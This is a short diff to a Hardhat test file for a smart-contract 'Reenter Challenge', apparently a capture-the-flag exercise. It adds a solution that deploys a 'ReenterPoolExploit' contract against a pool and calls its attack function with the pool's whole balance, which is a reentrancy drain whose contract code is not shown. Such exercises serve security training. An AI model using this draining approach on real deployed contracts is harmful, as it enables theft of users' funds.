@@ -27,6 +27,14 @@ describe("Reenter Challenge", function () {
 
   it("Exploit", async function () {
     /** CODE YOUR EXPLOIT HERE */
+    const ReenterPoolExploit = await ethers.getContractFactory(
+      "ReenterPoolExploit",
+      bob
+    );
+    this.exploit = await ReenterPoolExploit.deploy(this.pool.address);
+    var poolBalance = await ethers.provider.getBalance(this.pool.address);
+
+    this.exploit.connect(bob).attack(poolBalance);    
   });
 
   after(async function () {
